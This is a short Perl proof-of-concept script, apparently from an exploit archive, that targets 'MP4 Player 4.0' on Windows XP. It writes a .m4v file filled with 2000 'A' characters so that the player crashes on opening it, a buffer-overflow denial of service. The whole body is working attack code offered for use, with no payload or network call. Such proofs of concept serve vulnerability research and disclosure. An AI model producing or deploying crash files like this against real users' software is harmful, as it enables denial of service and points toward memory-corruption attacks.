#!usr/bin/perl
#Exploits title :[MP4 Player 4.0 Local Crash Poc]
#Date : [2010/01/02]
#Aouther : [SarBoT511]
#downloads :[http://mp4-player.ivefound.com]
#tested on :[win xp sp2]
#MP4 Player 4.0
#Greatz [2] :{ aB0 M0haM3d and lezr crew }

$file="SarBoT511.m4v";
$boom="A" x 2000;
open(myfile,">>$file");
print myfile $boom;
close(myfile);
print "Done ..! ~#";
